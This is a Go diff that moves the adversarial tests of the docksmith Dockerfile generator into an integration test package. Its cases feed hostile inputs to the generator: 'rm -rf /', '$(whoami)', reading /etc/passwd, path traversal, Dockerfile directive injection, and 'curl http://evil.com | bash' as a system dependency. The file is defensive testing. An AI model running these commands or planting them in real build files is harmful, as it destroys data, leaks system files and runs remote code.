@@ -1,4 +1,4 @@
-package docksmith
+package integration_test
 
 import (
 	"fmt"
@@ -8,7 +8,11 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/permanu/docksmith"
+	"github.com/permanu/docksmith/detect"
+	"github.com/permanu/docksmith/emit"
 	"github.com/permanu/docksmith/plan"
+	"github.com/permanu/docksmith/yamldef"
 )
 
 func TestPipeline_adversarialFrameworks(t *testing.T) {
@@ -18,26 +22,26 @@ func TestPipeline_adversarialFrameworks(t *testing.T) {
 
 	cases := []struct {
 		name string
-		fw   Framework
+		fw   docksmith.Framework
 	}{
-		{"shell_metachar_build", Framework{Name: "express", BuildCommand: "npm run build; rm -rf /", StartCommand: "node app.js", Port: 3000}},
-		{"backtick_start", Framework{Name: "express", BuildCommand: "npm run build", StartCommand: "`cat /etc/passwd`", Port: 3000}},
-		{"dollar_paren_start", Framework{Name: "express", BuildCommand: "npm run build", StartCommand: "$(whoami)", Port: 3000}},
-		{"name_spaces_slashes", Framework{Name: "express", BuildCommand: "build", StartCommand: "start", Port: 3000, OutputDir: "dist / .. / etc"}},
-		{"port_zero", Framework{Name: "express", StartCommand: "node app.js", Port: 0}},
-		{"port_negative", Framework{Name: "express", StartCommand: "node app.js", Port: -1}},
-		{"port_huge", Framework{Name: "express", StartCommand: "node app.js", Port: 99999}},
-		{"port_maxint", Framework{Name: "express", StartCommand: "node app.js", Port: math.MaxInt}},
-		{"empty_name", Framework{Name: ""}},
-		{"traversal_node_version", Framework{Name: "express", StartCommand: "node .", Port: 3000, NodeVersion: "../../etc/passwd"}},
-		{"traversal_output_dir", Framework{Name: "nextjs", StartCommand: "node .", Port: 3000, OutputDir: "../../../etc"}},
-		{"sysdep_injection", Framework{Name: "express", StartCommand: "node .", Port: 3000, SystemDeps: []string{"curl http://evil.com | bash"}}},
-		{"all_long_strings", Framework{Name: "express", BuildCommand: long, StartCommand: long, Port: 3000, OutputDir: long, NodeVersion: long}},
-		{"all_unicode", Framework{Name: "express", BuildCommand: unicode, StartCommand: unicode, Port: 3000, OutputDir: unicode}},
-		{"all_nulls", Framework{Name: "express", BuildCommand: nulls, StartCommand: nulls, Port: 3000, OutputDir: nulls}},
-		{"newline_in_build", Framework{Name: "express", BuildCommand: "npm build\nRUN whoami", StartCommand: "node .", Port: 3000}},
-		{"cr_in_start", Framework{Name: "express", BuildCommand: "npm build", StartCommand: "node .\rUSER root", Port: 3000}},
-		{"pipe_in_sysdeps", Framework{Name: "flask", StartCommand: "gunicorn app:app", Port: 8000, SystemDeps: []string{"gcc", "libpq-dev && curl evil.com"}}},
+		{"shell_metachar_build", docksmith.Framework{Name: "express", BuildCommand: "npm run build; rm -rf /", StartCommand: "node app.js", Port: 3000}},
+		{"backtick_start", docksmith.Framework{Name: "express", BuildCommand: "npm run build", StartCommand: "`cat /etc/passwd`", Port: 3000}},
+		{"dollar_paren_start", docksmith.Framework{Name: "express", BuildCommand: "npm run build", StartCommand: "$(whoami)", Port: 3000}},
+		{"name_spaces_slashes", docksmith.Framework{Name: "express", BuildCommand: "build", StartCommand: "start", Port: 3000, OutputDir: "dist / .. / etc"}},
+		{"port_zero", docksmith.Framework{Name: "express", StartCommand: "node app.js", Port: 0}},
+		{"port_negative", docksmith.Framework{Name: "express", StartCommand: "node app.js", Port: -1}},
+		{"port_huge", docksmith.Framework{Name: "express", StartCommand: "node app.js", Port: 99999}},
+		{"port_maxint", docksmith.Framework{Name: "express", StartCommand: "node app.js", Port: math.MaxInt}},
+		{"empty_name", docksmith.Framework{Name: ""}},
+		{"traversal_node_version", docksmith.Framework{Name: "express", StartCommand: "node .", Port: 3000, NodeVersion: "../../etc/passwd"}},
+		{"traversal_output_dir", docksmith.Framework{Name: "nextjs", StartCommand: "node .", Port: 3000, OutputDir: "../../../etc"}},
+		{"sysdep_injection", docksmith.Framework{Name: "express", StartCommand: "node .", Port: 3000, SystemDeps: []string{"curl http://evil.com | bash"}}},
+		{"all_long_strings", docksmith.Framework{Name: "express", BuildCommand: long, StartCommand: long, Port: 3000, OutputDir: long, NodeVersion: long}},
+		{"all_unicode", docksmith.Framework{Name: "express", BuildCommand: unicode, StartCommand: unicode, Port: 3000, OutputDir: unicode}},
+		{"all_nulls", docksmith.Framework{Name: "express", BuildCommand: nulls, StartCommand: nulls, Port: 3000, OutputDir: nulls}},
+		{"newline_in_build", docksmith.Framework{Name: "express", BuildCommand: "npm build\nRUN whoami", StartCommand: "node .", Port: 3000}},
+		{"cr_in_start", docksmith.Framework{Name: "express", BuildCommand: "npm build", StartCommand: "node .\rUSER root", Port: 3000}},
+		{"pipe_in_sysdeps", docksmith.Framework{Name: "flask", StartCommand: "gunicorn app:app", Port: 8000, SystemDeps: []string{"gcc", "libpq-dev && curl evil.com"}}},
 	}
 
 	for _, tc := range cases {
@@ -48,12 +52,12 @@ func TestPipeline_adversarialFrameworks(t *testing.T) {
 				}
 			}()
 
-			plan, err := Plan(&tc.fw)
+			p, err := docksmith.Plan(&tc.fw)
 			if err != nil {
-				return // expected for adversarial input
+				return
 			}
 
-			out := EmitDockerfile(plan)
+			out := docksmith.EmitDockerfile(p)
 			if strings.ContainsAny(out, "\x00") {
 				t.Error("null bytes in emitted Dockerfile")
 			}
@@ -97,22 +101,22 @@ func TestConfig_adversarialValues(t *testing.T) {
 
 			dir := t.TempDir()
 			os.WriteFile(filepath.Join(dir, tc.file), []byte(tc.content), 0o644)
-			cfg, err := LoadConfig(dir)
+			cfg, err := docksmith.LoadConfig(dir)
 			if err != nil {
-				return // adversarial — errors expected
+				return
 			}
 			if cfg == nil {
 				return
 			}
-			fw := ConfigToFramework(cfg)
+			fw := docksmith.ConfigToFramework(cfg)
 			if fw.Name == "dockerfile" {
 				return
 			}
-			plan, err := Plan(fw)
+			p, err := docksmith.Plan(fw)
 			if err != nil {
 				return
 			}
-			out := EmitDockerfile(plan)
+			out := docksmith.EmitDockerfile(p)
 			if strings.Contains(out, "\x00") {
 				t.Error("null bytes in output")
 			}
@@ -143,7 +147,7 @@ func TestShellSplit_adversarial(t *testing.T) {
 					t.Fatalf("panic: %v", r)
 				}
 			}()
-			result := shellSplit(tc.input)
+			result := emit.ShellSplit(tc.input)
 			if strings.Contains(result, "\x00") {
 				t.Errorf("null bytes in result: %q", result)
 			}
@@ -174,7 +178,7 @@ func TestJsonArray_adversarial(t *testing.T) {
 					t.Fatalf("panic: %v", r)
 				}
 			}()
-			result := jsonArray(tc.input)
+			result := emit.JSONArray(tc.input)
 			if !strings.HasPrefix(result, "[") || !strings.HasSuffix(result, "]") {
 				t.Errorf("malformed array: %q", result)
 			}
@@ -183,7 +187,7 @@ func TestJsonArray_adversarial(t *testing.T) {
 }
 
 func TestBuildPlan_fullPipelineStress(t *testing.T) {
-	frameworks := []Framework{
+	frameworks := []docksmith.Framework{
 		{Name: "nextjs", StartCommand: "node server.js", Port: 3000},
 		{Name: "django", StartCommand: "gunicorn app.wsgi", Port: 8000},
 		{Name: "flask", StartCommand: "gunicorn app:app", Port: 8000},
@@ -210,11 +214,11 @@ func TestBuildPlan_fullPipelineStress(t *testing.T) {
 				}
 			}()
 
-			plan, err := Plan(&fw)
+			p, err := docksmith.Plan(&fw)
 			if err != nil {
 				t.Skipf("Plan error (ok for stress): %v", err)
 			}
-			out := EmitDockerfile(plan)
+			out := docksmith.EmitDockerfile(p)
 			if out == "" {
 				t.Fatal("empty Dockerfile output")
 			}
@@ -252,7 +256,7 @@ func TestExtractDotPath_adversarial(t *testing.T) {
 					t.Fatalf("panic: %v", r)
 				}
 			}()
-			_ = extractDotPath(tc.root, tc.path)
+			_ = yamldef.ExtractDotPath(tc.root, tc.path)
 		})
 	}
 }
@@ -280,7 +284,7 @@ func TestBuildkitCacheArgs_adversarial(t *testing.T) {
 				}
 			}()
 
-			args := BuildkitCacheArgs(tc.appID)
+			args := docksmith.BuildkitCacheArgs(tc.appID)
 			if len(args) != 2 {
 				t.Fatalf("expected 2 args, got %d", len(args))
 			}
@@ -329,9 +333,9 @@ func TestParseVersionString_adversarial(t *testing.T) {
 					t.Fatalf("panic: %v", r)
 				}
 			}()
-			got := parseVersionString(tc.input)
+			got := detect.ParseVersionString(tc.input)
 			if got != tc.want {
-				t.Errorf("parseVersionString(%q) = %q, want %q", tc.input, got, tc.want)
+				t.Errorf("ParseVersionString(%q) = %q, want %q", tc.input, got, tc.want)
 			}
 		})
 	}
@@ -340,12 +344,12 @@ func TestParseVersionString_adversarial(t *testing.T) {
 func TestGenerateDockerignore_adversarial(t *testing.T) {
 	cases := []struct {
 		name string
-		fw   *Framework
+		fw   *docksmith.Framework
 	}{
 		{"nil_fw", nil},
-		{"empty_name", &Framework{Name: ""}},
-		{"unknown_name", &Framework{Name: "totally-unknown-framework-xyz"}},
-		{"unicode_name", &Framework{Name: "\u4f60\u597d"}},
+		{"empty_name", &docksmith.Framework{Name: ""}},
+		{"unknown_name", &docksmith.Framework{Name: "totally-unknown-framework-xyz"}},
+		{"unicode_name", &docksmith.Framework{Name: "\u4f60\u597d"}},
 	}
 
 	for _, tc := range cases {
@@ -357,16 +361,14 @@ func TestGenerateDockerignore_adversarial(t *testing.T) {
 			}()
 
 			if tc.fw == nil {
-				// GenerateDockerignore dereferences fw.Name — nil should panic or we guard it.
-				// Test that the library at least doesn't segfault silently.
 				func() {
 					defer func() { recover() }()
-					GenerateDockerignore(tc.fw)
+					docksmith.GenerateDockerignore(tc.fw)
 				}()
 				return
 			}
 
-			out := GenerateDockerignore(tc.fw)
+			out := docksmith.GenerateDockerignore(tc.fw)
 			if out == "" {
 				t.Error("expected non-empty dockerignore even for unknown framework")
 			}
@@ -375,8 +377,8 @@ func TestGenerateDockerignore_adversarial(t *testing.T) {
 }
 
 func TestSearchRegistry_adversarial(t *testing.T) {
-	idx := &RegistryIndex{
-		Frameworks: map[string]RegistryEntry{
+	idx := &docksmith.RegistryIndex{
+		Frameworks: map[string]docksmith.RegistryEntry{
 			"nextjs": {Description: "Next.js framework", Runtime: "node"},
 			"django": {Description: "Django web", Runtime: "python"},
 		},
@@ -384,7 +386,7 @@ func TestSearchRegistry_adversarial(t *testing.T) {
 
 	cases := []struct {
 		name  string
-		index *RegistryIndex
+		index *docksmith.RegistryIndex
 		query string
 	}{
 		{"nil_index", nil, "next"},
@@ -406,12 +408,12 @@ func TestSearchRegistry_adversarial(t *testing.T) {
 			if tc.index == nil {
 				func() {
 					defer func() { recover() }()
-					SearchRegistry(tc.index, tc.query)
+					docksmith.SearchRegistry(tc.index, tc.query)
 				}()
 				return
 			}
 
-			results := SearchRegistry(tc.index, tc.query)
+			results := docksmith.SearchRegistry(tc.index, tc.query)
 			if tc.query == "" && len(results) != len(tc.index.Frameworks) {
 				t.Errorf("empty query returned %d, want %d", len(results), len(tc.index.Frameworks))
 			}
@@ -443,7 +445,7 @@ func TestContainedPath_adversarial(t *testing.T) {
 					t.Fatalf("panic: %v", r)
 				}
 			}()
-			_, err := containedPath(base, tc.rel)
+			_, err := detect.ContainedPath(base, tc.rel)
 			if tc.wantErr && err == nil {
 				t.Error("expected error")
 			}
@@ -469,7 +471,7 @@ func TestSanitizeDockerfileArg_adversarial(t *testing.T) {
 
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			result := sanitizeDockerfileArg(tc.input)
+			result := emit.SanitizeDockerfileArg(tc.input)
 			if strings.ContainsAny(result, "\n\r\x00") {
 				t.Errorf("unsanitized chars in %q", result)
 			}
@@ -478,18 +480,18 @@ func TestSanitizeDockerfileArg_adversarial(t *testing.T) {
 }
 
 func TestPlan_nilFramework(t *testing.T) {
-	_, err := Plan(nil)
+	_, err := docksmith.Plan(nil)
 	if err == nil {
 		t.Fatal("Plan(nil) should error")
 	}
 }
 
 func TestGenerateDockerfile_nilAndDockerfile(t *testing.T) {
-	out, err := GenerateDockerfile(nil)
+	out, err := docksmith.GenerateDockerfile(nil)
 	if err != nil || out != "" {
 		t.Errorf("nil fw: got %q, %v", out, err)
 	}
-	out, err = GenerateDockerfile(&Framework{Name: "dockerfile"})
+	out, err = docksmith.GenerateDockerfile(&docksmith.Framework{Name: "dockerfile"})
 	if err != nil || out != "" {
 		t.Errorf("dockerfile fw: got %q, %v", out, err)
 	}
